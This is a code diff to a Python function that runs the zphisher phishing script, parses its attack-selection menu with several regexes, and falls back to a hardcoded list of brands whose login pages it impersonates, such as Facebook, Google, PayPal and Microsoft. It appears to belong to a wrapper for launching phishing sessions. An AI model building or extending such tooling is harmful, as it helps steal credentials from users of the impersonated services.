@@ -208,21 +208,44 @@ def stop_session(session_id):
 def fetch_zphisher_templates():
     import subprocess
     import re
-    if not os.path.exists(ZPHISHER_PATH):
-        return []
     try:
-        proc = subprocess.Popen(run_bash_command(['bash', ZPHISHER_PATH]), stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+        proc = subprocess.Popen(['bash', ZPHISHER_PATH], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
         output, _ = proc.communicate(timeout=20)
         templates = []
+        # Try to match [1] Facebook, 1) Facebook, or 1. Facebook
+        regexes = [
+            re.compile(r"\[\s*(\d+)\s*\]\s+(.+)", re.IGNORECASE),
+            re.compile(r"^(\d+)\)\s+(.+)", re.IGNORECASE),
+            re.compile(r"^(\d+)\.\s+(.+)", re.IGNORECASE)
+        ]
         for line in output.splitlines():
-            match = re.match(r"\[\s*(\d+)\s*\]\s+(.+)", line)
-            if match:
-                templates.append(match.group(2).strip())
-            if "Select An Attack" in line or "Select an option" in line or "Enter your choice" in line:
+            for regex in regexes:
+                match = regex.match(line.strip())
+                if match:
+                    templates.append(match.group(2).strip())
+                    break
+            if any(x in line for x in ["Select An Attack", "Select an option", "Enter your choice"]):
                 break
+        if not templates:
+            print("Zphisher template parse failed. Raw output:")
+            print(output)
+            # Fallback to hardcoded list
+            return [
+                "Facebook", "Instagram", "Google", "Microsoft", "Netflix", "Paypal", "Twitter", "LinkedIn",
+                "GitHub", "Wordpress", "Yahoo", "Twitch", "Pinterest", "Reddit", "Steam", "VK", "Yandex",
+                "DevianArt", "Protonmail", "Spotify", "Adobe", "Shopify", "Messenger", "Dropbox", "eBay",
+                "Badoo", "Origin", "CryptoCoin", "XBOX", "MediaFire", "GitLab", "PornHub", "Custom"
+            ]
         return templates
-    except Exception:
-        return []
+    except Exception as e:
+        print(f"Zphisher template fetch error: {e}")
+        # Fallback to hardcoded list
+        return [
+            "Facebook", "Instagram", "Google", "Microsoft", "Netflix", "Paypal", "Twitter", "LinkedIn",
+            "GitHub", "Wordpress", "Yahoo", "Twitch", "Pinterest", "Reddit", "Steam", "VK", "Yandex",
+            "DevianArt", "Protonmail", "Spotify", "Adobe", "Shopify", "Messenger", "Dropbox", "eBay",
+            "Badoo", "Origin", "CryptoCoin", "XBOX", "MediaFire", "GitLab", "PornHub", "Custom"
+        ]
 
 def get_history():
     with sessions_lock:
